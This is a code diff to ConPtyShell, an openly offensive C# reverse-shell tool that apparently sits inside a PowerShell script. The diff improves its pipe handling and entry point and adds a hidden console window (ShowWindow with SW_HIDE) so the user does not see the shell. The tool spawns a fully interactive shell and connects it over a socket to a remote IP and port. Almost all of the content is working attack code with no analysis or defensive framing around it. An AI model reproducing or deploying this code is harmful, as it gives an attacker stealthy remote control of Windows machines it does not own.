@@ -109,8 +109,10 @@ public static class ConPtyShell
     private const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
     private const uint CREATE_NO_WINDOW = 0x08000000;
     private const int STARTF_USESTDHANDLES = 0x00000100;
+    private const int BUFFER_SIZE_PIPE = 1048576;
 
     private const UInt32 INFINITE = 0xFFFFFFFF;
+    private const int SW_HIDE = 0;
     private const uint GENERIC_READ = 0x80000000;
     private const uint GENERIC_WRITE = 0x40000000;
     private const uint FILE_SHARE_READ = 0x00000001;
@@ -207,7 +209,7 @@ public static class ConPtyShell
     private static extern bool CloseHandle(IntPtr hObject);
     
     [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);
+    private static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);
 
     [DllImport("kernel32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
     private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr SecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
@@ -229,6 +231,19 @@ public static class ConPtyShell
 
     [DllImport("kernel32.dll", SetLastError = true)]
     private static extern bool GetConsoleMode(IntPtr handle, out uint mode);
+    
+    [DllImport("kernel32.dll")]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool AllocConsole();
+    
+    [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
+    private static extern bool FreeConsole();
+    
+    [DllImport("user32.dll")]
+    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+    [DllImport("kernel32.dll")]
+    private static extern IntPtr GetConsoleWindow();
     
     [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
     private static extern IntPtr GetModuleHandle(string lpModuleName);
@@ -271,20 +286,31 @@ public static class ConPtyShell
     }
     
     private static void CreatePipes(ref IntPtr InputPipeRead, ref IntPtr InputPipeWrite, ref IntPtr OutputPipeRead, ref IntPtr OutputPipeWrite){
-        int securityAttributeSize = Marshal.SizeOf<SECURITY_ATTRIBUTES>();
-        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES { nLength = securityAttributeSize, bInheritHandle=1, lpSecurityDescriptor=IntPtr.Zero };
-        if(!CreatePipe(out InputPipeRead, out InputPipeWrite, pSec, 0))
+        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
+        pSec.nLength = Marshal.SizeOf(pSec);
+        pSec.bInheritHandle=1;
+        pSec.lpSecurityDescriptor=IntPtr.Zero;
+        if(!CreatePipe(out InputPipeRead, out InputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
             throw new InvalidOperationException("Could not create the InputPipe");
-        if(!CreatePipe(out OutputPipeRead, out OutputPipeWrite, pSec, 0))
+        if(!CreatePipe(out OutputPipeRead, out OutputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
             throw new InvalidOperationException("Could not create the OutputPipe");
     }
     
-    private static void InitConsole(){
+    private static void InitConsole(ref IntPtr oldStdIn, ref IntPtr oldStdOut, ref IntPtr oldStdErr){
+        oldStdIn = GetStdHandle(STD_INPUT_HANDLE);
+        oldStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
+        oldStdErr = GetStdHandle(STD_ERROR_HANDLE);
         IntPtr hStdout = CreateFile("CONOUT$", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
         IntPtr hStdin = CreateFile("CONIN$", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
         SetStdHandle(STD_OUTPUT_HANDLE, hStdout);
         SetStdHandle(STD_ERROR_HANDLE, hStdout);
         SetStdHandle(STD_INPUT_HANDLE, hStdin); 
+    }
+    
+    private static void RestoreStdHandles(IntPtr oldStdIn, IntPtr oldStdOut, IntPtr oldStdErr){
+        SetStdHandle(STD_OUTPUT_HANDLE, oldStdOut);
+        SetStdHandle(STD_ERROR_HANDLE, oldStdErr);
+        SetStdHandle(STD_INPUT_HANDLE, oldStdIn); 
     }
     
     private static void EnableVirtualTerminalSequenceProcessing()
@@ -305,7 +331,10 @@ public static class ConPtyShell
     private static int CreatePseudoConsoleWithPipes(ref IntPtr handlePseudoConsole, ref IntPtr ConPtyInputPipeRead, ref IntPtr ConPtyOutputPipeWrite, uint rows, uint cols){
         int result = -1;
         EnableVirtualTerminalSequenceProcessing();
-        result = CreatePseudoConsole(new COORD { X = (short)cols, Y = (short)rows }, ConPtyInputPipeRead, ConPtyOutputPipeWrite, 0, out handlePseudoConsole);
+        COORD consoleCoord = new COORD();
+        consoleCoord.X=(short)cols;
+        consoleCoord.Y=(short)rows;
+        result = CreatePseudoConsole(consoleCoord, ConPtyInputPipeRead, ConPtyOutputPipeWrite, 0, out handlePseudoConsole);
         return result;
     }
     
@@ -318,7 +347,7 @@ public static class ConPtyShell
             throw new InvalidOperationException("Could not calculate the number of bytes for the attribute list. " + Marshal.GetLastWin32Error());
         }
         STARTUPINFOEX startupInfo = new STARTUPINFOEX();
-        startupInfo.StartupInfo.cb = Marshal.SizeOf<STARTUPINFOEX>();
+        startupInfo.StartupInfo.cb = Marshal.SizeOf(startupInfo);
         startupInfo.lpAttributeList = Marshal.AllocHGlobal(lpSize);
         success = InitializeProcThreadAttributeList(startupInfo.lpAttributeList, 1, 0, ref lpSize);
         if (!success)
@@ -336,9 +365,11 @@ public static class ConPtyShell
     private static PROCESS_INFORMATION RunProcess(ref STARTUPINFOEX sInfoEx, string commandLine)
     {
         PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
-        int securityAttributeSize = Marshal.SizeOf<SECURITY_ATTRIBUTES>();
-        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES { nLength = securityAttributeSize };
-        SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES { nLength = securityAttributeSize };
+        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
+        int securityAttributeSize = Marshal.SizeOf(pSec);
+        pSec.nLength = securityAttributeSize;
+        SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
+        tSec.nLength = securityAttributeSize;
         bool success = CreateProcess(null, commandLine, ref pSec, ref tSec, false, EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref sInfoEx, out pInfo);
         if (!success)
         {
@@ -419,9 +450,13 @@ public static class ConPtyShell
         IntPtr OutputPipeRead = new IntPtr(0);
         IntPtr OutputPipeWrite = new IntPtr(0);
         IntPtr handlePseudoConsole = new IntPtr(0);
+        IntPtr oldStdIn = new IntPtr(0);
+        IntPtr oldStdOut = new IntPtr(0);
+        IntPtr oldStdErr = new IntPtr(0);
+        bool newConsoleAllocated = false;
         PROCESS_INFORMATION childProcessInfo = new PROCESS_INFORMATION();
         CreatePipes(ref InputPipeRead, ref InputPipeWrite, ref OutputPipeRead, ref OutputPipeWrite);
-        InitConsole();
+        InitConsole(ref oldStdIn, ref oldStdOut, ref oldStdErr);
         if(GetProcAddress(GetModuleHandle("kernel32"), "CreatePseudoConsole") == IntPtr.Zero){
             Console.WriteLine("\r\nCreatePseudoConsole function not found! Spawning a netcat-like interactive shell...\r\n");
             STARTUPINFO sInfo = new STARTUPINFO();
@@ -434,6 +469,11 @@ public static class ConPtyShell
         }
         else{
             Console.WriteLine("\r\nCreatePseudoConsole function found! Spawning a fully interactive shell...\r\n");
+            if(GetConsoleWindow() == IntPtr.Zero){
+                AllocConsole();
+                ShowWindow(GetConsoleWindow(), SW_HIDE);
+                newConsoleAllocated = true;
+            }
             int pseudoConsoleCreationResult = CreatePseudoConsoleWithPipes(ref handlePseudoConsole, ref InputPipeRead, ref OutputPipeWrite, rows, cols);
             if(pseudoConsoleCreationResult != 0)
             {
@@ -456,6 +496,9 @@ public static class ConPtyShell
         thReadSocketWritePipe.Abort();
         shellSocket.Shutdown(SocketShutdown.Both);
         shellSocket.Close();
+        RestoreStdHandles(oldStdIn, oldStdOut, oldStdErr);
+        if(newConsoleAllocated)
+            FreeConsole();
         CloseHandle(childProcessInfo.hThread);
         CloseHandle(childProcessInfo.hProcess);
         if (handlePseudoConsole != IntPtr.Zero) ClosePseudoConsole(handlePseudoConsole);
@@ -467,7 +510,8 @@ public static class ConPtyShell
 }
 
 public static class ConPtyShellMainClass{
-    private static string help = "";
+    private static string help = @"
+";
     
     private static bool HelpRequired(string param)
     {
@@ -546,6 +590,14 @@ public static class ConPtyShellMainClass{
             output=ConPtyShell.SpawnConPtyShell(remoteIp, remotePort, rows, cols, commandLine);
         }
         return output;
+    }
+}
+
+
+class MainClass{
+    static void Main(string[] args)
+    {
+        Console.Out.Write(ConPtyShellMainClass.ConPtyShellMain(args));
     }
 }
 "@;
